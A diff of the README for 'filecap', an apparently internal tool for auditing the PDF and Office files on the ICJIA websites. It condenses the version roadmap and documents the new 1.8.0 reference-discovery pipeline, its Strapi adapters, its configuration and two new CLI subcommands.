-| 19 | v1.7.6 | shipped | Access-method chip on every index card + matching "How to access this site's files" panel on every per-site detail page; auto-classifies each site into `strapi` / `github` / `server` from existing `sites.json` fields via new exported `deriveAccessKind(site)` helper; color-coded (cyan/violet/amber) with WCAG AA contrast; both surfaces close on "Contact IDS at ICJIA to request access." with OpenSSH-key or GitHub-org-access copy as appropriate |
-| 20 | v1.7.7 | shipped | Whole-card click fix on index page — switched from broken z-index stretched-link to a `pointer-events: none` cascade with re-enables on action buttons + tech-details summary; copy-to-clipboard buttons on five rows of the detail-page meta-grid (IP, hostname, scanned path, scanned at, public URL) with green "Copied" affordance, navigator.clipboard.writeText + execCommand fallback |
-| 21 | v1.7.8 | shipped | Index-card "Technical details" disclosure now shows a five-row mini-grid (Website, IP, Hostname, Path, URL) with a copy-to-clipboard button on every row; URL row keeps a clickable `<a target="_blank">` alongside the copy button. Plus a sweep through all manager-facing strings to soften prescriptive "needs/need …" to "may need …" (the bucket phrases on cards + detail dp-hero, the audit-share tile/donut labels, the by-file-type column headings, the duplicates explainer, the row-color legend, the `audit-summary.txt` text deliverable, the `README.txt` template) — filecap describes what the data suggests, the audit team decides what to do. |
-| 22 | v1.7.9 | shipped | Donut percentage centring fix — `text-align: center` on `.site-card .donut .pct` so the percentage + caption sit visually centred inside the donut hole regardless of caption length. (Pre-v1.7.9 it was accidentally OK because "need audit" and "67%" were near-equal widths; v1.7.8's longer "may need audit" exposed that the `.pct` box was a left-aligned column.) |
-| 23 | v1.7.10 | shipped | Donut grown from 130 × 130 px to 180 × 180 px (and ::after inset 14 → 22) so "MAY NEED AUDIT" comfortably fits inside the inner hole with ~10 px of clearance on each side from the colored ring; percentage glyph upsized from 1.5 em → 1.7 em for proportional balance. |
-| 24 | v1.7.11 | shipped | Per-site detail page's row-marker legend redesigned as a proper 3-column `<table>` (Marker / What it means / What to do about it) with `<thead>` labels, row dividers, and a `@media (max-width: 700px)` stacked fallback — replaces the pre-v1.7.11 flex-paragraph layout that wrapped mid-clause across five lines. |
-| 25 | v1.7.12 | shipped | Image-only PDF row tint now actually visible — hidden CSS specificity bug present since v1.0.2 where `tbody tr:nth-child(even/odd)` (0,1,2) outranked `tr.image-only` (0,1,1), so only the first cell rendered the tint. Fixed via `tbody tr.image-only td` (0,1,3) and a colour bump from luminance-twin `#111000` to clearly amber `#3a2c08` (≥ 8:1 contrast on `#e5e5e5` text). |
-| 26 | v1.7.13 | shipped | Index hero redesigned around the **audit count** rather than the total — pre-v1.7.13 the hero led with the 14k+ total-files number which managers misread as "the audit scope," and the new hero leads with the actionable count in 105 px amber with the total in a secondary context line. Two-column infographic: big number on the left, 200 px donut + plain-English phrase on the right. Stacks under 720 px. |
-| 27 | v1.7.14 | shipped | Per-file-type detail pages with CSV downloads — every non-empty bucket in the index's "By file type" table emits both `audit-<slug>.csv` (filtered master, every row tagged with its source server) and `audit-<slug>.html` (per-site-style detail page reusing the dp-hero pattern). New exported `TYPE_BUCKETS` constant is the single source of truth (used by both the writer in web-rollup.js and the index renderer); each bucket has `keys` (so legacy-office/office-legacy synonyms merge), `side`, `label`, `slug`. |
-| 28 | v1.7.15 | shipped | Three small index-page changes: cards alphabetized by siteFullName via `localeCompare(..., { sensitivity: "base" })`; ARI Summit cards renamed across all four years to "ARI All Sites Summit YYYY" (was "Adult Redeploy …"); ICJIA wordmark added to the index navbar (~13 kB inline SVG with `currentColor` fills so dark navbar gets white and print mode gets black without forking markup). |
-| 29 | v1.7.16 | shipped | Three CSV/workflow changes: every CSV (per-site, master, by-type) gains two staff-fill columns — `Delete?` (default "No") and `Notes` (default "") — flagged `csvOnly` so the HTML view stays at 14 columns; visible PDF audit-tool button (links to audit.icjia.app, opens new tab) in the index navbar and per-site sticky bar; "Last audit: <date>" caption beneath every CSV download button. |
-| 30 | v1.7.17 | shipped | Cross-server duplicates section made info-only — pulled the `audit-file-duplicates.csv` download button (file still emitted server-side, available by direct URL); replaced with a "For information only" callout listing three concrete reasons duplicate removal is trickier than removing a unique file (N-times search surface, "wrong copy" risk, asymmetric references). |
-| 31 | v1.7.18 | shipped | Plain-English explainer beneath the "N-times the search surface" reason — unpacks `N` and `Big O notation` for non-technical readers, contrasts `O(N)` with `O(1)`, and closes with a concrete "5–15 minutes per copy" budget for the manager. |
-| 32 | v1.7.19 | shipped | Duplicates table filter (Remediable only / Reference only / All) defaulting to Remediable; "Some duplicates are intentional and required" callout covering meeting agendas posted on both a specialty site and the ICJIA main site for Open Meetings Act compliance. |
-| 33 | v1.7.20 | shipped | Git-type entries link to GitHub `/blob/` URL instead of publicUrlBase + path — the static-site Netlify deploys have an SPA `_redirects` catch-all that returns the homepage HTML for unmatched paths, so deployed-URL links looked correct but went nowhere; GitHub source is the reliable destination. Duplicates hero numbers + counting-note now dynamically follow the active filter so the headline always corresponds to the current view. |
-| 34 | v1.7.21 | shipped | "For AI models" section added between the master CSV and the duplicates section. Two new read-only companion files: `audit-fleet.ndjson` (consolidated NDJSON with full introspection — PDF page count, image-only flag, DOCX heading coverage, alt-text coverage, XLSX sheet count, all the fields the CSV strips for vendor readability) and `audit-fleet-context.md` (narrative with summary stats, schema doc, sample LLM prompts). Framed deliberately as **optional + forward-looking** — state-agency AI policy is still evolving, the section explains why the files are there and that the CSVs remain the actionable artefact. |
-| 35 | v1.7.22 | shipped | Big "Cross-Server Duplicates" section banner with 72 × 5 px amber-gradient accent bar above the existing duplicates hero — eye now sees a clear "new section starts here" break after the For-AI-models block. |
-| 36 | v1.7.23 | shipped | Mirror "Section · Fleet snapshot" banner at the top of the page (blue gradient — distinguishes from duplicates' amber) so the page reads as two symmetric major sections. Prominent green "Zero PII" reassurance banner with two side-by-side IN / NOT-IN lists (filenames + file metadata + format-specific structure on the IN side; SSNs / DOB / driver's licenses / names / addresses / phone / email / case-file content / personnel records / credentials on the NOT-IN side) plus an Intranet-specific footnote. |
-| 37 | v1.7.24 | shipped | Duplicates explainer compressed from five colored callouts (historical context + "not an error" + "intentional" + exact/variant cards + false-positives caveat) into one cohesive block — three tight paragraphs + the exact/variant kind-cards + a collapsed `<details>` for the false-positives caveat. Same content, ~50 % less visual noise. Navbar audit-tool button label: "Use ICJIA's PDF audit tool" → "Try ICJIA's PDF audit tool" (softer suggestion, less prescriptive). |
-| 38 | v1.7.25 | shipped | PII banner relocated from top of page to immediately above the "Websites in this audit" site grid (audit numbers + donut hero get the above-the-fold position); headline spelled out as "Zero Personally Identifying Information (PII) in this audit" so non-technical readers don't misread the acronym as "PILL"; banner vertically tightened ~30 % (smaller padding, icon, font sizes — no content cuts). |
-| 39 | v1.7.26 – v1.7.29 | shipped | Sticky-bar polish on per-site detail pages (button alignment + smaller fonts), `ICJIA Accessibility FAQs` navbar button paired with the audit-tool button, dynamic site-count in the top-section lede, empty-default `Delete?` column (CSV can't carry validation dropdowns), green gradient on the detail-page CSV download button (distinct from the blue "navigate elsewhere" register), and label tightening (`ICJIA PDF Audit Tool`, no possessive). See [CHANGELOG entries v1.7.26 – v1.7.29](CHANGELOG.md) for the per-version breakdown. |
-| 40 | v1.7.30 | shipped | New violet-accented **"Coming soon"** section at the bottom of the fleet index — eyebrow + clamped headline + lede + accent bar, mirroring the existing fleet / duplicates banner anatomy. Lists four reference-discovery items currently in development on a side branch: the **Referenced** + **Status** columns ("where is this file linked from?" / Active or Orphan verdict), **cross-site reference detection**, **SPA-page rendering** (for sites where the curl crawler sees only an empty shell), and **sitemap-validated reference URLs** so clicked references never 404. Visual register: violet (`#d2a8ff` → `#8957e5`) — a third color identity beyond the existing blue (current state) and amber (warning) so the eye instantly registers the section as "upcoming." Links out to the CHANGELOG so managers can track progress between releases. |
-| — | 1.8.0 alpha (in branch) | in progress | Reference discovery: per-site `Referenced` + `Status` columns (Active / Orphan candidate / Discovery N/A), sitemap-driven HTML crawl with polite throttling, automatic Strapi GraphQL fallback for SPA sites (auto-detected; supports v3 + v4 schemas with typed-media-relation discovery), cross-site reference resolver, coverage banner explaining what was actually scanned. Work-in-progress; see the Coming-soon section on the deployed fleet index. |
-| — | vNext | deferred | Headless rendering for SPA sites where Strapi GraphQL fallback isn't sufficient (custom client-rendered tables like ARI's resources page); strapi-aware mode (separate package); content-type sanity check on URL preflight; `filecap process-deletions <csv>` to read staff-edited CSV Delete?-Yes rows and remove the matching files on each source server. |
+| Version line | Status | Highlight |
+|---|---|---|
+| v0.1 – v0.6 | shipped | Phased core: scan → PDF/Office introspection → filename flags → rollup → CSV report |
+| v1.0.x | shipped | MCP server + AI-client docs + audit automation scripts + HTML report |
+| v1.1.0 – v1.2.0 | shipped | Column-set trim; `filecap web-rollup` static-site bundle with Netlify amenities |
+| v1.3.x | shipped | Red/blue team security audit (17 findings, all Critical and Moderate fixed); auto-detected `sites.json`; opt-in `webRollup.autoDeploy`; bearer-token support |
+| v1.4.x – v1.5.x | shipped | CSV trim to 14 columns; click-and-drag horizontal pan; cross-server duplicates section with explainer; master + duplicates CSVs in bundle |
+| v1.6.x | shipped | `type:"git"` site mode for Nuxt static-site repos (shallow-clone + scan); mixed strapi + git fleets in one bundle |
+| v1.7.x | shipped | Manager-friendly visual redesign: infographic site cards, big audit-count hero, copy-to-clipboard buttons throughout, per-file-type drill-down, `Delete?` + `Notes` staff-fill columns, access-method modal, PII reassurance banner, sticky-bar polish on per-site detail pages |
+| **v1.8.0-alpha.1 / beta.1 / beta.2** | **pre-release** | **References pipeline: `Referenced` column on CSV + HTML, per-site Strapi extractor (v3 + v4 GraphQL/REST), fleet-wide cross-site reverse index, domain-alias-aware URL matching. 9 of 9 Strapi sites in fleet now contributing.** |
+| v1.8.0 beta.3 / stable | planned | Bearer-token references for `intranet-api-prod`; git-repo references for the 7 `type:"git"` Nuxt sites; index-page coverage stat; optional Playwright regression harness |
+| vNext | deferred | Headless rendering for SPA sites where Strapi fallback isn't sufficient; `filecap process-deletions <csv>` to act on staff-edited `Delete?=Yes` rows |
 
 ### Production deployment
 
@@ -511,6 +384,78 @@ If you're handing this off to an auditor or accessibility coordinator, copy the 
 >
 > 4. The fleet deliverable is at `~/filecap-audits/_fleet/latest/`. Email the whole folder (or the `consolidated-report/` subfolder) to your remediation vendor.
 
+## Reference discovery (1.8.0)
+
+**The "where is this PDF linked from?" question.** Every manager who opens a filecap audit asks the same thing first: "Where on the site is this PDF used?" Without that answer, the delete-vs-keep decision requires manual verification — defeating the audit's purpose. 1.8.0 surfaces the answer directly in the report.
+
+**New per-file column.** A `Referenced` column slots in after `Duplicate of` on every CSV and HTML view, listing the page URLs that link to each file. Cell semantics:
+
+- `entry.references` populated → anchor chips (HTML) or newline-joined URLs (CSV).
+- `entry.references` empty array `[]` → muted "No references found" chip — we looked and found none.
+- `entry.references` missing key → empty cell — cross-references step hasn't been run yet.
+
+**Pipeline.** Two new subcommands run between `scan` and `web-rollup`:
+
+```
+scan (per server)               → per-server inventory NDJSON
+↓
+references <siteName>           → per-site references sidecar NDJSON (new in 1.8.0)
+                                  (queries the site's CMS, classifies fields,
+                                   extracts file URLs, resolves deployed page URLs)
+↓
+cross-references <inventory>    → augmented inventory with entry.references[]
+                                   populated (new in 1.8.0)
+                                  (builds the fleet-wide URL → referrers reverse
+                                   index, applies domain-alias resolution)
+↓
+web-rollup                      → CSV + HTML + Netlify bundle with Referenced column
+```
+
+`references` and `cross-references` are re-runnable independently when CMS data changes or routing rules are updated; a GraphQL failure on one content type only drops that type, not the whole run.
+
+**Strapi adapters.** Two parallel modules, dispatched by `references.strategy` in each site's `sites.json` entry:
+
+- **`strapi-v3`** — Used by `icjia-agency-prod`, `spac-prod`, `researchhub-prod`, `ari-api-prod`, `ilfvcc-api-prod` (and `intranet-api-prod` when bearer-token auth lands). REST: `/<plural>?_limit=N&_start=N`, flat entry shape `{id, slug, body, ...}`. GraphQL introspection via `*Connection` paginator field for schema-driven plural detection (handles irregular forms like `county → counties`).
+- **`strapi-v4`** — Used by `dvfr-strapi-prod`, `r3-strapi-prod`, `i2i-strapi-prod`, `infonet-strapi-prod`. REST: `/api/<plural>?pagination[limit]=N&pagination[start]=N&populate=*`, wrapped entry shape `{id, attributes: {…}}`. Typed-media envelopes `UploadFileEntityResponse` (single) and `UploadFileRelationResponseCollection` (list). Per-content-type `pluralName` quirks handled with a kebab-case fallback on first 404.
+
+**Schema-driven field classification.** Both adapters share `src/references/field-classifier.js`, which bucketis each GraphQL `__type` field into url-string (read directly), body-string (regex-extract URLs from markdown), upload-file / upload-file-list (typed media references), or relation / other (skipped — enumerated separately or not URL-bearing). New content types added to any Strapi site are picked up automatically; no per-site hardcoding.
+
+**Domain whitelist + alias resolution.** Each extracted URL is checked against a fleet domain set auto-derived from every site's `publicUrlBase` + `siteUrl` + optional `domainAliases` hosts. Federal, state, partner-org, and third-party links never make it into the Referenced column. The alias map collapses `archive.icjia-api.cloud` (backend host stored on Strapi) onto `archive.icjia.cloud` (the canonical archive URL) so cross-site references match correctly — without it, ~99% of archive-PDF references would silently fail to match because content cites the backend host.
+
+**`references` block in sites.json.** Configured per Strapi site:
+
+```jsonc
+{
+  "name": "dvfr-strapi-prod",
+  // ...
+  "references": {
+    "strategy": "strapi-v4",                               // or "strapi-v3"
+    "graphqlEndpoint": "https://dvfr.icjia-api.cloud/graphql",
+    "restApiBase": "https://dvfr.icjia-api.cloud",
+    "siteFrontendUrl": "https://dvfr.illinois.gov",
+    "sitemapUrl": "https://dvfr.illinois.gov/sitemap.xml",
+    "contentTypeRoutes": {
+      "meeting": "/meetings/:slug/",
+      "post": "/news/:slug/",
+      "publication": "/publications/:slug/"
+    }
+  }
+}
+```
+
+`contentTypeRoutes` are derived empirically by sampling each site's `sitemap.xml`. `:slug` is filled in per entry; the result is the deployed page URL the Referenced column links to.
+
+**Verified design (not speculative).** Before writing the extractor we probed the live `icjia.illinois.gov` SPA via Chrome devtools against the Strapi backend at `agency.icjia-api.cloud`:
+
+- On a Grant page (`2020-casa`), the rendered SPA's three file hrefs equalled exactly the three URLs extracted from the entry's `body` markdown via URL regex — perfect 1:1 match. Confirms body-markdown extraction captures everything the rendered page links to.
+- On a Publication page, the rendered SPA had **zero** `<a href="…pdf">` anchors — the download is driven by a Vuetify `<button class="article-download">` whose target URL lives only in Vue component state and never reaches the DOM. The PDF URL was, however, present in the Strapi entry's `fileURL` field. Any rendered-page scraping approach would miss all 1,107 publications on the ICJIA main site.
+
+This was the deciding factor: Strapi data is strictly more complete than what the rendered SPA exposes, so Strapi-API extraction is the primary strategy, not headless scraping.
+
+**Coverage as of v1.8.0-beta.2.** 9 of 9 Strapi sites in the audit fleet contribute to the cross-site references index (all v3 + all v4). End-to-end fleet runs at beta.1 produced 2,861 of 6,748 inventoried files (42%) with at least one known referrer — including 49% of archive files and 79% of the legacy Research Hub files. See the [CHANGELOG](CHANGELOG.md) entries for per-release coverage tables.
+
+---
+
 ## CLI reference
 
 ### `filecap scan <directory>`
@@ -550,6 +495,23 @@ Generate vendor handoff package (CSV + summary + flagged lists) from an inventor
 |---|---|---|
 | `-o, --output <dir>` | `./filecap-report-<ts>/` | Output directory |
 | `--html` | (off) | Also write a self-contained sortable dark-mode HTML report (`audit-file-list.html`) |
+
+### `filecap references <siteName>` *(new in 1.8.0)*
+
+Per-site reference extractor. Reads the site's `references.*` block from `sites.json`, dispatches to the matching strategy (`strapi-v3` or `strapi-v4`), and writes an NDJSON sidecar with one record per content entry — naming the deployed page URL and the file URLs that page references.
+
+| Flag | Default | Description |
+|---|---|---|
+| `-o, --output <path>` | (required) | Output NDJSON sidecar path. Convention: `<site>.refs.ndjson` |
+
+### `filecap cross-references <inventory>` *(new in 1.8.0)*
+
+Fleet-wide reverse-index resolver. Reads every site's sidecar (via `--sidecar` flags) and `~/.filecap/sites.json` (for domain-alias resolution), builds a URL → referrers index, and walks the named inventory NDJSON to attach `entry.references[]` to each file via canonical-URL match. Writes the augmented inventory.
+
+| Flag | Default | Description |
+|---|---|---|
+| `-s, --sidecar <path>` | (required, repeatable) | Path to a `references` sidecar NDJSON. Repeat for every site in the fleet. |
+| `-o, --output <path>` | (required) | Output path for the augmented inventory NDJSON |
 
 ### `filecap web-rollup`
 
